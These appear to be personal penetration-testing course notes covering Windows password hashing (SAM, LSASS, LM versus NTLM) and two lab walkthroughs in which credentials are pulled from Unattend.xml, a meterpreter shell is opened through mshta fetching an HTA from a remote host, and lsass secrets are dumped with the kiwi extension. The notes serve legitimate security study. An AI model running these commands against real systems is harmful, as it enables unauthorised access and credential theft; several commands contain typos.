
### Windows Password Hashing
the windows OS stores hashed user account passwords locally in the SAM (security accounts manager) database

hashing is the process of converting a piece of data into another value a hashing function or algorithm is known as a hash value

authentication and verification of user credentials is facilitated by the local security authority (LSA)

- windows versions up to windows server 2003 utilize two different types of hashes:
- LM
- NTLM
Windows disables LM hashing and utilizes NTML hashing from windows vista onwards


the windows NT kernel keeps the SAM database file locked and as a result the attackers typically utilize in-memory techniques and tools to dump Sam hashes from the LSASS  process 

- in modern versions of windows the sam database is encrypted with a syskey 

Note: Elevated/administrative privileges are required in order to access and interact with the LSASS process


LM : is the default hashing algorithm that was implemented in windows operating system prior to NT40

NTLM : IS A collection of authentication protocols that are utilized in windows to facilitate authentication between computers the authentication process involves using a valid username and password to authenticate successfully

NTLM improves upon LM in the following ways:
- does not split the hash in to two chunks
- case sensitive
- allows the use of symbols and Unicode character 

from windows vista onwards windows disables LM hashing and utilizes NTLM hashing


Searching for passwords in windows configuration files
- windows can automate a variety of repetitive tasks such the mass rollout or installation of windows on many systems
- if the unattended windows setup configuration files are left on the target system after installation they can reveal user account credentials that can be used by attackers to authenticate with windows target legitimately

### Unattended installation Lab

	Step 1: Switch to Attacker Machine for locating a privilege escalation vulnerability.
	Step 2: Open powershell.exe terminal to check the current user
	Step 3: We will run the powerup.ps1 Powershell script to find privilege escalation vulnerability
	-cd.\Desktop\PowerSploit\Privesc\
	ls
	Step 4: Import PowerUp.ps1 script and Invoke-PrivescAudit function
	powershell -ep bypass (Powershell execution policy bypass)
	. .\PowerUp.ps1
	Invoke-PrivescAudit
	cat C:\\Windows\Panther\Unattend.xml
	Step 6: Decoding administrator password using Powershell
	$password='QWRtaW5AMTIz'
	$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
	ssword))
	echo $password
	Step 7: We are running a command prompt as an administrator user using discover credentials
	unas.exe /user:administrator cmd
	Admin@123
	whoami
	Step 8: Running the hta_server module to gain the meterpreter shell. Start msfconsole.
	msfconsole -q
	use exploit/windows/misc/hta_server
	exploit
	Step 9: Gaining a meterpreter shell.
	mshta.exe http://10.10.0.2:8080/6Nz7aySfPN.hta
	sessions -i 1
	cd /
	cd C:\\Users\\Administrator\\Desktop
	dir
	cat flag.txt

#### Windows: Meterpreter: Kiwi Extension Lab
	nmap ip
	nmap -sV -p80 ip
	searchsploit hfs
	msfconsole -q
	use exploit/windows/http/badblue_passthru
	set RHOSTS ip
	exploit
	migrate -N lsass.exe
	load kiwi
	creds_all
	lsa_dump_sam
	lsa_dump_secrets
	